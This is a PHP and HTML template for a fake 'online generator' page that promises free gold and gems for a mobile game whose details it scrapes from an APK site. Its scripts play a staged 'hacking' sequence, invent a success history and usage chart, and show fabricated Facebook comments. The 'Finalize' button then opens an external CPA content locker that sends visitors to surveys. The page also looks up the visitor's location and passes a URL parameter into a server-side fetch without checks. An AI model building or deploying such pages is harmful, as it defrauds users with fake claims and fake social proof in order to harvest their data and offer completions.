<?php
include 'includes/functions.php';
$id=$_GET['nama'];
$url = ''.$dpath.''.$id.'';

$hot = strstr(grab($url), '<div class="col-sm-12 col-md-8">');
$cat = bersihbesarawal(potong($hot, '<a href="https://apkplz.net/category/game-', '"'));
$img = potong($hot, '<img src="', '"');
$title = kotorbesarawal(potong($hot, 'alt="', ' Apk"'));
$desc = potong($hot, '<div class="detail-small">', '</div>');
$ver = explode('<ul class="list-unstyled">', $hot);
$versi = potong($ver[1], '<li>Version: ', '<li>');
$yy = ''.date("Y").'';
?>
<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title><?= $title ?> Online Generator Working on Android and iOS</title>
    <meta name="Description" CONTENT="Get the latest hacks, cheats, and working generators for <?= $title ?>.">
<meta name="referrer" content="no-referrer">
    <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
    <!-- Material Design Icons  -->
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link href='https://fonts.googleapis.com/css?family=Oswald' rel='stylesheet' type='text/css'>
    <!-- Roboto Web Font -->
    <link href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en" rel="stylesheet">

    <link rel="shortcut icon" type="image/png" href="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/smartphone_icon.png"/>

    <!-- Simplebar.js -->
    <link type="text/css" href="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/simplebar.css" rel="stylesheet">

    <!-- App CSS -->
    <link type="text/css" href="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/style.min.css" rel="stylesheet">

    <!-- Charts CSS -->
    <link rel="stylesheet" href="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/morris.min.css">

    <link href="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/content_lockers/sweetalert.css" rel="stylesheet" type="text/css" />

    <link type="text/css" href="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/facebook-comments.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/content_lockers/css_front.css">

    <style type="text/css">
        .material-icons    {text-rendering: optimizeLegibility}
        #generate{
            font-family: 'Oswald', sans-serif;
            text-align: center;
        }
        .btn i.material-icons {
            max-width: 28px;
        }
        .loader {
            margin: 60px auto;
            font-size: 10px;
            position: relative;
            text-indent: -9999em;
            border-top: 1.1em solid #039BE5;
            border-right: 1.1em solid rgba(0, 0, 0, 0.2);
            border-bottom: 1.1em solid rgba(0, 0, 0, 0.2);
            border-left: 1.1em solid rgba(0, 0, 0, 0.2);
            -webkit-transform: translateZ(0);
            -ms-transform: translateZ(0);
            transform: translateZ(0);
            -webkit-animation: load8 1.1s infinite linear;
            animation: load8 1.1s infinite linear;
        }
        .loader,
        .loader:after {
            border-radius: 50%;
            width: 10em;
            height: 10em;
        }
        @-webkit-keyframes load8 {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
        @keyframes load8 {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
        @-moz-keyframes spin { 100% { -moz-transform: rotate(360deg); } }
        @-webkit-keyframes spin { 100% { -webkit-transform: rotate(360deg); } }
        @keyframes spin { 100% { -webkit-transform: rotate(360deg); transform:rotate(360deg); } }


        @keyframes bounce {
            0%,100%       { top:-3px; }
            50%      { top:3px; }
        }

        .blink{
            animation: blink 1.1s infinite linear;
        }
        .pulsate{
            animation: pulsate 2s infinite linear;

        }
        @keyframes blink {
            0%,100%       { opacity:1; }
            50%      { opacity:0.8; }
        }
        .spin{
            -webkit-animation:spin 4s linear infinite;
            -moz-animation:spin 4s linear infinite;
            animation:spin 4s linear infinite;
        }
        .material-icons.bounce{
            animation:bounce 1.5s linear infinite;
        }
        @keyframes pulsate {
            0%,100% {transform: scale(1.0, 1.0); }
            50% {transform: scale(0.95, 1.0); }
        }
    </style></head>
<!-- Analytics -->
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    
    ga('send', 'pageview');
</script>

<body class="layout-container ls-top-navbar">
<script>(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s); js.id = id;
    js.src = "http://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6&appId=228853223903552";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-79769934-1', 'auto');
    ga('send', 'pageview');

</script>
<!-- Navbar -->
<nav class="navbar navbar-dark bg-primary navbar-full navbar-fixed-top">
    <div class="container">

        <!-- Navbar toggle -->
        <button class="navbar-toggler hidden-md-up pull-xs-right" type="button" data-toggle="collapse" data-target="#navbarMenu"><span class="material-icons">menu</span></button>

        <!-- Brand -->

        <!-- Collapse -->
        <div class="collapse navbar-toggleable-xs" id="navbarMenu">
            <ul class="nav navbar-nav">
                <li class="nav-item">
                    <a class="nav-link" href="#">Elite Private Hacking Tools</a>
                </li>
            </ul>
        </div>
        <!-- // END Collapse -->

        <!-- Menu -->

        <!-- // END Menu -->

    </div>
</nav>
<!-- // END Navbar -->

<div class="layout-content" data-scrollable>
    <div class="container">

        <!-- Breadcrumb -->
        <ol class="breadcrumb">
        <li><a href="/">Home</a></li>
            <li><a href="#">Dashboard</a></li>
            <li class="active"><?= $title ?></li>
        </ol>

        <!-- Row -->
        <div class="row">
            <div class="col-lg-12">
                <div class="card card-stats-primary">
                    <div class="card-block" style="padding-top:10px;padding-bottom: 10px;">
                        <img src="<?= $img ?>" style="width:50px; height:50px;"/>
                        <h5 style="display:inline;"><?= $title ?> Online Tools <?= $yy ?></h5>
                    </div>
                </div>
            </div>

            <!-- Column -->    
<div class="col-lg-8">
                <div class="card">
                    <div class="card-block" id="tasks" style="display:none;">
                        <p class="text-muted pull-xs-right"><span id="taskCount" data-count="0">1</span> of 17</p>
                        <h5 class="m-b-1"><i class="material-icons">list</i> <span class="icon-text">Tasks</span></h5>
                        <progress class="progress progress-animated progress-primary m-a-0" id="taskProgress" value="0" max="100">50%
                        </progress>
                    </div>
                </div>
                <div class="card" id="generate" style="display:none;">
                    <div class="card-block">
                        <h5 class="card-title" id="working">Working<div class="ellipsis" style="display: inline-block;width: 0px;"></div></h5>
                        <p class="card-text">
                        <div id="loadingContainer"><div class="loader"></div></div>
                        <div id="status" style="text-align: center;"></div>
                        <progress class="progress progress-primary progress-animated" value="0" max="100" id="status_progress" style="margin-top:25px;">0</progress>
                        </p>
                    </div>
                </div>
                <div class="card" id="formCard">
                    <div class="card-block">
                        <h5 style="margin-bottom: 30px;"><span style="margin-right:20px;" class="label label-info">V<?= $versi ?></span> <?= $title ?> </h5>
                        <form id="form" action="#">
                            <div class="form-group row">
                                <label for="username" class="col-sm-3 form-control-label"><i class="material-icons">person</i> Username</label>
                                <div class="col-sm-9">
                                    <input type="text" class="form-control" id="username" placeholder="<?= $title ?> Username">
                                </div>
                            </div>
                            <div class="form-group row">
                                <label for="value" class="col-sm-3 form-control-label"><i class="material-icons">iso</i> Amount</label>
                                <div class="col-sm-9">
                                    <input type="text" class="form-control" id="value" placeholder="Gold, Coin, Gems, and Diamonds (Max 999,999,999)">
                                </div>
                            </div>
                            <div class="form-group row">
                                <label for="coins" class="col-sm-3 form-control-label"><i class="material-icons">phone_iphone</i> Device</label>
                                <div class="col-sm-9">
                                    <select class="form-control" id="exampleSelect1">
                                        <option value="0">Select Device...</option>
                                        <option value="1">Android</option>
                                        <option value="2">iPhone</option>
                                    </select>
                                </div>
                            </div>
                            <div class="form-group row">
                                <label class="col-sm-3">Anti-Ban</label>
                                <div class="col-sm-9">
                                    <button type="button" disabled="disabled" class="btn btn-success">
                                        <i class="material-icons">done</i>
                                        <span class="icon-text">Enabled</span>
                                    </button>
                                </div>
                            </div>
                            <div class="form-group row">
                                <label class="col-sm-3">Target Server</label>
                                <div class="col-sm-9">
                                    <button type="button" disabled="disabled" class="btn btn-info">
                                        <i class="material-icons bounce">location_on</i>
                                        <span class="icon-text" id="locationSpan">Searching...</span>
                                    </button>
                                </div>
                            </div>
                            <div class="form-group row">
                                <label class="col-sm-3">Download</label>
                                <div class="col-sm-9">
                                    <button type="button" disabled="disabled" class="btn btn-default">
                                        <i class="material-icons">error</i>
                                        <span class="icon-text">Download Not Required</span>
                                    </button>
                                </div>
                            </div>
                            <div class="form-group row m-b-0">
                                <div class="col-sm-12">
                                    <button type="submit"  style="margin-top: 30px;width: 100%;" class="btn btn-primary">
                                        <i class="material-icons">build</i>
                                        <span class="icon-text">Generate</span>
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <!-- Column -->
            <div class="col-lg-4">
                <div class="card">
                    <div class="card-button-wrapper">
                        <i class="material-icons spin" style="color:#039BE5;">autorenew</i>
                    </div>
                    <div class="card-block center">
                        <h5 class="card-title">Usage</h5>
                        <p class="card-subtitle">201 Today</p>
                        <!-- <div id="bar2" style="height: 130px; margin:0 -10px;"></div> -->
                        <canvas id="lineChart2" height="135"></canvas>

                    </div>
                </div>
            </div>
            <!-- // END Column -->     
            <!-- Column -->
            <div class="col-lg-4">
                <div class="card">
                    <ul class="nav nav-tabs">
                        <li class="nav-item">
                            <a class="nav-link active" id="history-tab" data-toggle="tab" href="#history" aria-expanded="true">
                                <i class="material-icons">schedule</i> <span class="icon-text">History</span>
                            </a>
                        </li>
                    </ul>
                    <div class="tab-content">
                        <div class="tab-pane fade active in" id="history" aria-expanded="true">
                            <ul class="list-group list-group-fit" id="historyList" style="overflow:hidden;">
                                <li class="list-group-item">
                                    <div class="media">
                                        <div class="media-left media-middle">
                                            <i class="material-icons md-36 text-muted">done</i>
                                        </div>
                                        <div class="media-body">
                                            <p class="m-a-0">
                                                <a href="#">hydroge587</a> generated <a href="#">~68M Gold</a>
                                            </p>
                                            <small class="text-muted">
                                                <span class="label label-success">Success</span>
                                                <i class="material-icons md-18">timer</i> <span class="icon-text"> few seconds ago</span>
                                            </small>
                                        </div>
                                    </div>
                                </li>
                                <li class="list-group-item">
                                    <div class="media">
                                        <div class="media-left media-middle">
                                            <i class="material-icons md-36 text-muted">warning</i>
                                        </div>
                                        <div class="media-body">
                                            <p class="m-a-0">
                                                <a href="#">pickyov747</a> generated <a href="#">~112M Gold</a>
                                            </p>
                                            <small class="text-muted">
                                                <span class="label label-danger">failed</span>
                                                <i class="material-icons md-18">timer</i> <span class="icon-text"> few seconds ago</span>
                                            </small>
                                        </div>
                                    </div>
                                </li>
                                <li class="list-group-item">
                                    <div class="media">
                                        <div class="media-left media-middle">
                                            <i class="material-icons md-36 text-muted">warning</i>
                                        </div>
                                        <div class="media-body">
                                            <p class="m-a-0">
                                                <a href="#">pickyov747</a> generated <a href="#">~112M Gold</a>
                                            </p>
                                            <small class="text-muted">
                                                <span class="label label-danger">failed</span>
                                                <i class="material-icons md-18">timer</i> <span class="icon-text"> few seconds ago</span>
                                            </small>
                                        </div>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <!-- // END Column -->

        </div>
        <!-- // END Row -->
        <div class="row">
            <div class="col-md-12">

                <div class="card">

                    <div class="card-block">
                        <h5 class="card-title">Comments</h5>

                        <div class="fb_comments_container">
                            <div class="fb_comments_count_cover">11 Comments</div>
                            <div class="fb-comments" data-href="" data-numposts="5" style="width:100%;" data-width="100%"></div>
                        </div>
                        <div class="fb_comment_section">
                            <div class="fb_comment_wrapper">
                                <div class="fb_image_block">
                                    <img src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/api_uploads/14695289673fef93e6256f71978bec74c87ea8f0f3.jpg" class="fb_pic">
                                </div>
                                <div class="fb_comment_block">
                                    <div class="fb_name">Talabi Adeboye</div>
                                    <div class="fb_comment">Do I have to take a survey to use this?</div>
                                    <div class="fb_meta">
                                        <a href="#" class="fb_like fb_meta_item">Like</a> ·
                                        <a href="#" class="fb_like fb_meta_item">Reply</a> ·

                                        <img class="fb_like_button fb_meta_item" src="https://www.facebook.com/images/ufi/fbfeed/like.png"><span class="like_count fb_meta_item">2,321</span> ·
                                        <span class="fb_timestamp">3 months ago</span></div>
                                </div>
                            </div><div class="fb_comment_wrapper">
                            <div class="fb_image_block">
                                <img src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/api_uploads/1469528955629ec46d8f9b4f44e11a37a90d0d2512.jpg" class="fb_pic">
                            </div>
                            <div class="fb_comment_block">
                                <div class="fb_name">Carmenza Duran Pena</div>
                                <div class="fb_comment">Yes you have to take a survey but it only took 2 minutes and now I generated 20M! Thank you for this tool!</div>
                                <div class="fb_meta">
                                    <a href="#" class="fb_like fb_meta_item">Like</a> ·
                                    <a href="#" class="fb_like fb_meta_item">Reply</a> ·

                                    <img class="fb_like_button fb_meta_item" src="https://www.facebook.com/images/ufi/fbfeed/like.png"><span class="like_count fb_meta_item">5,321</span> ·
                                    <span class="fb_timestamp">3 days ago</span></div>
                            </div>
                        </div><div class="fb_comment_wrapper">
                            <div class="fb_image_block">
                                <img src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/api_uploads/1469528962b1e4d1b64d2e64630f598a1e6e209527.jpg" class="fb_pic">
                            </div>
                            <div class="fb_comment_block">
                                <div class="fb_name">Bart Ommen</div>
                                <div class="fb_comment">Can I get around the survey???</div>
                                <div class="fb_meta">
                                    <a href="#" class="fb_like fb_meta_item">Like</a> ·
                                    <a href="#" class="fb_like fb_meta_item">Reply</a> ·

                                    <img class="fb_like_button fb_meta_item" src="https://www.facebook.com/images/ufi/fbfeed/like.png"><span class="like_count fb_meta_item">721</span> ·
                                    <span class="fb_timestamp">a week ago</span></div>
                            </div>
                        </div><div class="fb_comment_wrapper">
                            <div class="fb_image_block">
                                <img src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/api_uploads/1469528961583b2dbf531b948eae7a4d8f97c97c7c.jpg" class="fb_pic">
                            </div>
                            <div class="fb_comment_block">
                                <div class="fb_name">Adam Lui</div>
                                <div class="fb_comment">Working thank you!!!</div>
                                <div class="fb_meta">
                                    <a href="#" class="fb_like fb_meta_item">Like</a> ·
                                    <a href="#" class="fb_like fb_meta_item">Reply</a> ·

                                    <img class="fb_like_button fb_meta_item" src="https://www.facebook.com/images/ufi/fbfeed/like.png"><span class="like_count fb_meta_item">1,021</span> ·
                                    <span class="fb_timestamp">2 weeks ago</span></div>
                            </div>
                        </div><div class="fb_comment_wrapper">
                            <div class="fb_image_block">
                                <img src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/api_uploads/14695289618fa240c8179fef6bbc3e1102e9e00275.jpg" class="fb_pic">
                            </div>
                            <div class="fb_comment_block">
                                <div class="fb_name">Mary Cabuhat</div>
                                <div class="fb_comment">Survey required...at the end...</div>
                                <div class="fb_meta">
                                    <a href="#" class="fb_like fb_meta_item">Like</a> ·
                                    <a href="#" class="fb_like fb_meta_item">Reply</a> ·

                                    <img class="fb_like_button fb_meta_item" src="https://www.facebook.com/images/ufi/fbfeed/like.png"><span class="like_count fb_meta_item">873</span> ·
                                    <span class="fb_timestamp">2 weeks ago</span></div>
                            </div>
                        </div><div class="fb_comment_wrapper">
                            <div class="fb_image_block">
                                <img src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/api_uploads/1469528955c7d6a0c83577fa0089b70eaebd5c64d6.jpg" class="fb_pic">
                            </div>
                            <div class="fb_comment_block">
                                <div class="fb_name">Thomas Guski</div>
                                <div class="fb_comment">Does it work?</div>
                                <div class="fb_meta">
                                    <a href="#" class="fb_like fb_meta_item">Like</a> ·
                                    <a href="#" class="fb_like fb_meta_item">Reply</a> ·

                                    <img class="fb_like_button fb_meta_item" src="https://www.facebook.com/images/ufi/fbfeed/like.png"><span class="like_count fb_meta_item">89</span> ·
                                    <span class="fb_timestamp">3 weeks ago</span></div>
                            </div>
                        </div><div class="fb_comment_wrapper">
                            <div class="fb_image_block">
                                <img src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/api_uploads/14695289648ff6aff90360352c91e9ab5fd564adeb.jpg" class="fb_pic">
                            </div>
                            <div class="fb_comment_block">
                                <div class="fb_name">Abby Robinson</div>
                                <div class="fb_comment">First working generator I have found thank you thank you</div>
                                <div class="fb_meta">
                                    <a href="#" class="fb_like fb_meta_item">Like</a> ·
                                    <a href="#" class="fb_like fb_meta_item">Reply</a> ·

                                    <img class="fb_like_button fb_meta_item" src="https://www.facebook.com/images/ufi/fbfeed/like.png"><span class="like_count fb_meta_item">1,872</span> ·
                                    <span class="fb_timestamp">a month ago</span></div>
                            </div>
                        </div><div class="fb_comment_wrapper">
                            <div class="fb_image_block">
                                <img src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/api_uploads/1469528959daad143fce05613e163ee8d06a4ee092.jpg" class="fb_pic">
                            </div>
                            <div class="fb_comment_block">
                                <div class="fb_name">Ümit Dayan</div>
                                <div class="fb_comment">This saved my life</div>
                                <div class="fb_meta">
                                    <a href="#" class="fb_like fb_meta_item">Like</a> ·
                                    <a href="#" class="fb_like fb_meta_item">Reply</a> ·

                                    <img class="fb_like_button fb_meta_item" src="https://www.facebook.com/images/ufi/fbfeed/like.png"><span class="like_count fb_meta_item">1,272</span> ·
                                    <span class="fb_timestamp">a month ago</span></div>
                            </div>
                        </div><div class="fb_comment_wrapper">
                            <div class="fb_image_block">
                                <img src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/api_uploads/1469528955eb9b970fb68f5193029245548fa365fb.jpg" class="fb_pic">
                            </div>
                            <div class="fb_comment_block">
                                <div class="fb_name">Pepper Chilli</div>
                                <div class="fb_comment">Just put in valid info for survey it will activate after a few minutes</div>
                                <div class="fb_meta">
                                    <a href="#" class="fb_like fb_meta_item">Like</a> ·
                                    <a href="#" class="fb_like fb_meta_item">Reply</a> ·

                                    <img class="fb_like_button fb_meta_item" src="https://www.facebook.com/images/ufi/fbfeed/like.png"><span class="like_count fb_meta_item">2,983</span> ·
                                    <span class="fb_timestamp">a month ago</span></div>
                            </div>
                        </div><div class="fb_comment_wrapper">
                            <div class="fb_image_block">
                                <img src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/api_uploads/1469528957a2bbb415a5c68283110d0f656267ae52.jpg" class="fb_pic">
                            </div>
                            <div class="fb_comment_block">
                                <div class="fb_name">Suman Saha</div>
                                <div class="fb_comment">Worked perfectly and my account is active 2 months later!!!</div>
                                <div class="fb_meta">
                                    <a href="#" class="fb_like fb_meta_item">Like</a> ·
                                    <a href="#" class="fb_like fb_meta_item">Reply</a> ·

                                    <img class="fb_like_button fb_meta_item" src="https://www.facebook.com/images/ufi/fbfeed/like.png"><span class="like_count fb_meta_item">2,098</span> ·
                                    <span class="fb_timestamp">2 months ago</span></div>
                            </div>
                        </div><div class="fb_comment_wrapper">
                            <div class="fb_image_block">
                                <img src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/api_uploads/1469528964ca399c687c1e6b531460d5a28288799f.jpg" class="fb_pic">
                            </div>
                            <div class="fb_comment_block">
                                <div class="fb_name">Lety Mbantul</div>
                                <div class="fb_comment">wow thank you good tool</div>
                                <div class="fb_meta">
                                    <a href="#" class="fb_like fb_meta_item">Like</a> ·
                                    <a href="#" class="fb_like fb_meta_item">Reply</a> ·

                                    <img class="fb_like_button fb_meta_item" src="https://www.facebook.com/images/ufi/fbfeed/like.png"><span class="like_count fb_meta_item">872</span> ·
                                    <span class="fb_timestamp">2 months ago</span></div>
                            </div>
                        </div>

                            <hr class="fb_line">
                            <div class="fb_plugin"><img src="https://www.facebook.com/images/like/icons/fav.png" class="fb_icon"> <a href="#" class="fb_plugin_link">Facebook Comments Plugin</a></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-md-12">
                <div class="card">
                    <div class="card-block">
                        <h5 class="card-title">App Information</h5>
                        <p class="card-text">
                            
                           <?= $desc ?>

                    </div>
                </div>
            </div>

        </div>


    </div>
</div>
<script data-cfasync="false" src="https://dwnlds.co/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
    var CPABUILDSETTINGS={"it":542371,"key":"670c4"};
</script>
<script src="http://app.dwnlds.co/public/external/locker.js"></script>
<!-- jQuery -->
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/jquery.min.js"></script>

<!-- Bootstrap -->
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/tether.min.js"></script>
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/bootstrap.min.js"></script>

<!-- Simplebar.js -->
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/simplebar.min.js"></script>

<!-- Bootstrap Layout -->
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/bootstrap-layout.js"></script>

<!-- Bootstrap Layout Scrollable Extension JS -->
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/bootstrap-layout-scrollable.js"></script>

<!-- Theme Colors -->
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/colors.js"></script>

<!-- Charts JS -->
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/raphael.min.js"></script>
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/morris.min.js"></script>

<!-- ChartJS -->
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/Chart.min.js"></script>

<!-- Init -->
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/chart.js"></script>
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/chartjs.js"></script>
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/sweetAlert.js"></script>
<script src="http://s3-us-west-1.amazonaws.com/bucket.cpabuild.com/assets/landing_pages/block.js"></script>
<script type="text/javascript">
    var locationArr={
        city:"New York",
        continent:"NA",
        country:"US",
        ip:"192.0.117.221",
        latitude:32.7977,
        longitude:-117.2335,
        state:"New York",
        state_code:"NY",
        zip_code:"11249",
        updated:0
    };
    var totalTasks=17;
    var username,value;
    var visitorID;
    $(document).ready(function(){
        location();

        var progressLoop;
        function location(){
            //
            $.getJSON('http://app.dwnlds.co/public/scripts/location.php?callback=?','',function(res){
                if(res){
                    locationArr=res;
                    $('#locationSpan').html(locationArr.city+", "+locationArr.state)
                }
            });
        }
        function randomNumber(min,max){
            return Math.floor((Math.random() * max) + min);
        }
        function addHistoryItem(){

            var randSeed=randomNumber(1,10);
            var history=$('#historyList');
            var currentHeight=history.height();
            var lastItem=history.children().last();

            var badge="<span class='label label-danger'>Failed</span>";
            var icon="warning";
            if(randSeed < 8){
                badge="<span class='label label-success'>Success</span>";
                icon="done";
            }
            var username = usernames[Math.floor(Math.random()*usernames.length)];
            username=username.substr(0,7);
            username=username+randomNumber(100,999);
            var html=$('#historyTemplate').html().replace('%username%',username).replace("%badge%",badge).replace('%amount%',randomNumber(1,100)).replace("%icon%",icon);

            history.css('height',currentHeight+'px');
            $(html).hide().prependTo(history).fadeIn(600);
            lastItem.remove();
            history.css('height','inherit');
            setTimeout(function(){addHistoryItem()},randomNumber(2000,10000));

        }
        addHistoryItem();
        ellipsis();


        $('#form').submit(function(e){
            e.preventDefault();
            username=$('#username').val();
            value=parseInt($('#value').val());
            if(username==""){
                sweetAlert("Oops...", "Username required", "error");
            }
            else if(!value){
                sweetAlert("Oops...", "Gold amount required", "error");
            }
            else{
                $('#formCard').remove();
                $('#tasks').css('display','block');
                $('#generate').css('display','block');
                displayMessages(0);
            }

            return false;
        });
        function taskBar(){
            var taskCount=$('#taskCount');
            var count=parseInt(taskCount.data('count'));
            var percent=(count+1)/totalTasks;
            taskCount.data('count',count+1);
            taskCount.html(count+1);

            $('#taskProgress').val(percent*100);
        }
        function displayMessages(index){
            clearInterval(progressLoop);
            $('#status_progress').val(100);

            var status=$('#status');
            var message=messages[index];

            if(typeof message=="undefined"){
                //Last message reached
                var checkMarkHTML=$('#checkmark').html();
                $('#loadingContainer').html(checkMarkHTML);
                $('#working').html("Success!");
                status.css('margin-top','30px');
                status.html('<button type="button" id="offerButton" class="btn btn-warning pulsate"><i class="material-icons">done</i><span>Success! Click Here To Finalize</button>');
                $('#offerButton').click(function(){
                    CPABuildLock();
                });
                $('#status_progress').removeClass("progress-primary").addClass("progress-success");
                return false;
            }
            var next=index+1;
            message.message=message.message.replace("%username%",username).replace("%value%",value);
            if(message.type=="task"){
                status.html(message.message);
                progressBar(message.time);
                taskBar();

            }
            if(message.type=="retry"){
                status.html(message.message);
                progressBar(message.time);

            }
            if(message.type=="append"){
                status.append(message.message);

            }

            setTimeout(function(){
                displayMessages(next);
            },message.time);
        }
        function progressBar(time){
            var counter=0;
            var progress=$('#status_progress');
            progressLoop=setInterval(function(){
                var percent=counter*1000/time;
                progress.val(percent);
                counter++;
                if(counter > time){
                    clearInterval(progressLoop);
                }
            },10);
        }
        function ellipsis(){
            var dom=$('.ellipsis');
            var text=dom.text();
            if(text=="")
                dom.text('.');
            if(text==".")
                dom.text('..');
            if(text=="..")
                dom.text('...');
            if(text=="...")
                dom.text('.');
            setTimeout(function(){ellipsis();},500);
        }
        var startingData=[10, 59, 23, 81, 56, 55, 40];
        function updateData(){
            startingData.push(Math.floor((Math.random() * 100) + 1));
            startingData.shift();
        }
        var linedata = {
            labels: ["Today", "Today", "Today", "Today", "Today", "Today", "Today"],
            color: colors['chart-primary'],
            datasets: [
                {
                    label: "Usage",
                    fill: true,
                    backgroundColor: rgbPerc( colors[ 'chart-primary' ], .1),

                    borderColor: colors[ 'chart-primary' ],
                    borderCapStyle: 'butt',
                    borderJoinStyle: 'miter',

                    pointBorderWidth: 5,
                    pointBorderColor: colors[ 'chart-primary' ],


                    pointBackgroundColor: colors[ 'chart-primary' ],

                    pointHoverRadius: 5,
                    pointHoverBackgroundColor: "#fff",
                    pointHoverBorderWidth: 0,


                    data: startingData,
                }
            ]
        };
        var options={
            type: 'line',
            data: linedata,
            options: {
                animation:{
                    duration:5,
                },
                legend: {
                    display: false
                },
                hover:{
                    enabled: false,
                    display:false
                },
                scales: {
                    xAxes: [{
                        display: false
                    }],
                    yAxes: [{
                        ticks: {
                            fontColor: rgbPerc(colors[ 'chart-primary' ],.84),
                            fontStyle: '500',
                            fontSize: 14,
                            beginAtZero: true,
                            max:100
                        },
                        gridLines: {
                            color:  rgbPerc(colors[ 'chart-primary' ], .1),
                            zeroLineColor:  rgbPerc(colors[ 'chart-primary' ], .2)
                        }
                    }],

                }
            },
        };

        var barChart=new Chart($("#lineChart2"),options);
        updateChart();
        function updateChart(){
            setTimeout(function(){
                updateData(5);
                barChart.data.datasets[0].data = startingData;
                barChart.update();
                updateChart();
            },2000);
        }

    });
    var messages=[
        {
            message:"Pinging nearest server...",
            time:2000,
            type: "task"
        },
        {
            message:'<span class="label label-success" style="font-family: Roboto,sans-serif">Success</span>',
            time:500,
            type: "append"
        },
        {
            message:"Checking public key...",
            time:1000,
            type: "task"
        },
        {
            message:"Verifying hash...",
            time:800,
            type: "task"
        },
        {
            message:"Compiling injection script...",
            time:2700,
            type: "task"
        },
        {
            message:"Extracting...",
            time:1300,
            type: "task"
        },
        {
            message:"Checking auth token...",
            time:600,
            type: "task"
        },
        {
            message:"Connecting to account (method 1/3)...",
            time:2500,
            type: "task"
        },
        {
            message:'<span class="label label-danger" style="font-family: Roboto,sans-serif">Failed</span>',
            time:2000,
            type: "append"
        },
        {
            message:"Connecting to account (method 2/3)...",
            time:2500,
            type: "retry"
        },
        {
            message:'<span class="label label-success" style="font-family: Roboto,sans-serif">Connected: %username%</span>',
            time:1200,
            type: "append"
        },
        {
            message:"Downloading values...",
            time:700,
            type: "task"
        },
        {
            message:"Random sleep timer (Anti-Ban)...",
            time:3300,
            type: "task"
        },
        {
            message:"Sending packets...",
            time:600,
            type: "task"
        },
        {
            message:"Encrypting...",
            time:900,
            type: "task"
        },
        {
            message:"Format JSON...",
            time:1200,
            type: "task"
        },
        {
            message:"Reading config.js...",
            time:400,
            type: "task"
        },
        {
            message:'Changing value <span class="label label-danger" style="font-family: Roboto,sans-serif">33,312</span> to <span class="label label-success" style="font-family: Roboto,sans-serif">%value%</span>...',
            time:400,
            type: "task"
        },
        {
            message:'Locking value...',
            time:600,
            type: "task"
